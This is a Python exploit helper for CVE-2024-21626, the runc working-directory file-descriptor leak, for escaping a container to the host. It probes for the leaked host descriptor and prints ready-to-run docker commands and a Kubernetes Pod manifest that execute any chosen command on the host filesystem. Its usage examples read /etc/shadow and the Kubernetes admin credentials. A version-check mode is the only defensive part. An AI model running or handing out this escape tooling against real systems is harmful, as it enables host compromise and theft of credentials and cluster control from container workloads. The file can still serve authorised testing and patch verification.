#!/usr/bin/env python3
"""runc_cwd_escape.py - CVE-2024-21626 ("Leaky Vessels") working-directory fd-leak escape helper.

runc <=1.1.11 leaks a host-namespace fd (the host /sys/fs/cgroup handle, usually fd 7/8/9) into the
container's pid1. Setting the process working directory to /proc/self/fd/<N> lands pid1's CWD on the
HOST filesystem; `../../` then walks the real host root.

This tool:
  --probe        : from INSIDE a container, find which /proc/self/fd/<N> resolves to the host root
                   (heuristic: contains host-only paths and is NOT the container rootfs).
  --cmd "<sh>"   : emit ready-to-run docker (`-w /proc/self/fd/N`) and a Kubernetes Pod manifest
                   (workingDir) that execute the given command against the host filesystem.
  --check        : report local runc/docker/containerd version vs the affected ranges.

USAGE:
  python3 runc_cwd_escape.py --probe
  python3 runc_cwd_escape.py --cmd 'id; cat ../../etc/shadow'
  python3 runc_cwd_escape.py --cmd 'cat ../../etc/kubernetes/admin.conf' --fd 8 --image busybox
  python3 runc_cwd_escape.py --check

Dependencies: Python 3.6+, stdlib only. Read-only probing; no host writes unless your --cmd does so.
Authorized engagements only.
"""
import argparse
import os
import shutil
import subprocess
import sys

HOST_MARKERS = ("etc/kubernetes", "var/lib/kubelet", "var/lib/docker", "boot", "etc/fstab")


def probe(fd_range):
    """Find a leaked fd whose /proc/self/fd/<N>/../../ exposes the host filesystem."""
    found = []
    for n in fd_range:
        link = f"/proc/self/fd/{n}"
        if not os.path.exists(link):
            continue
        try:
            target = os.readlink(link)
        except OSError:
            target = "?"
        # Walk up two levels (the documented escape path) and look for host-only markers.
        host_root = os.path.join(link, "..", "..")
        hits = []
        try:
            entries = set(os.listdir(host_root))
        except OSError:
            entries = set()
        for m in HOST_MARKERS:
            top = m.split("/", 1)[0]
            if top in entries:
                hits.append(m)
        # cgroup leak: target typically points under /sys/fs/cgroup on the host ns
        is_cgroup = "cgroup" in target or "sys/fs" in target
        if hits or is_cgroup:
            found.append((n, target, sorted(entries)[:12], hits))
    return found


def cmd_check():
    def ver(binname, args):
        if not shutil.which(binname):
            return None
        try:
            out = subprocess.run([binname] + args, capture_output=True, text=True, timeout=10)
            return (out.stdout + out.stderr).strip().splitlines()[0]
        except Exception:
            return None
    print("[*] Runtime version triage (CVE-2024-21626 affects runc >=1.0.0-rc93, <=1.1.11)")
    for b, a in (("runc", ["--version"]), ("docker", ["version", "--format", "{{.Server.Version}}"]),
                 ("containerd", ["--version"]), ("crictl", ["--version"])):
        v = ver(b, a)
        print(f"    {b:11}: {v if v else '(not found)'}")
    print("    -> runc<=1.1.11 / containerd<1.6.28,<1.7.13 / docker<25.0.2 are vulnerable.")


def emit_payloads(cmd, fd, image):
    # In K8s pid1 cannot be an interactive shell; payload must be one-shot / revshell.
    docker_line = (
        f"docker run --rm -w /proc/self/fd/{fd} {image} "
        f"sh -c {sh_quote(cmd)}"
    )
    pod = f"""apiVersion: v1
kind: Pod
metadata:
  name: lv-escape
spec:
  restartPolicy: Never
  containers:
  - name: c
    image: {image}
    workingDir: /proc/self/fd/{fd}        # CVE-2024-21626 leaked host-cwd fd
    command: ["sh","-c"]
    args: [{sh_quote(cmd)}]
"""
    print("=== Docker one-liner (try --fd 7, 8, 9) ===")
    print(docker_line)
    print("\n=== Kubernetes Pod manifest (kubectl apply -f -) ===")
    print(pod)
    print("Note: getcwd() will error; access the host via the relative ../../ walk from the fd.")


def sh_quote(s):
    return "'" + s.replace("'", "'\\''") + "'"


def main():
    ap = argparse.ArgumentParser(description="CVE-2024-21626 runc working-dir fd-leak escape helper")
    ap.add_argument("--probe", action="store_true", help="find the leaked host-fs fd from inside a container")
    ap.add_argument("--cmd", help="command to run against the host fs (emits docker + k8s payloads)")
    ap.add_argument("--fd", type=int, default=8, help="leaked fd number to use in payloads (default 8)")
    ap.add_argument("--image", default="busybox", help="container image for payloads (default busybox)")
    ap.add_argument("--check", action="store_true", help="report local runtime versions vs CVE range")
    args = ap.parse_args()

    if args.check:
        cmd_check()
    if args.probe:
        print("[*] Probing /proc/self/fd/6..12 for a leaked host-filesystem descriptor ...")
        res = probe(range(6, 13))
        if not res:
            print("    no leaked host fd found (runtime may be patched, or fd numbers differ).")
        for n, target, entries, hits in res:
            tag = "<< HOST ROOT via ../../" if hits else "<< host-ns cgroup handle"
            print(f"    fd {n} -> {target}  {tag}")
            print(f"        ../../ lists: {entries}")
            if hits:
                print(f"        host markers: {hits}")
                print(f"        => use:  docker run -w /proc/self/fd/{n} ...  /  workingDir: /proc/self/fd/{n}")
    if args.cmd:
        emit_payloads(args.cmd, args.fd, args.image)
    if not (args.check or args.probe or args.cmd):
        ap.print_help()


if __name__ == "__main__":
    sys.exit(main())
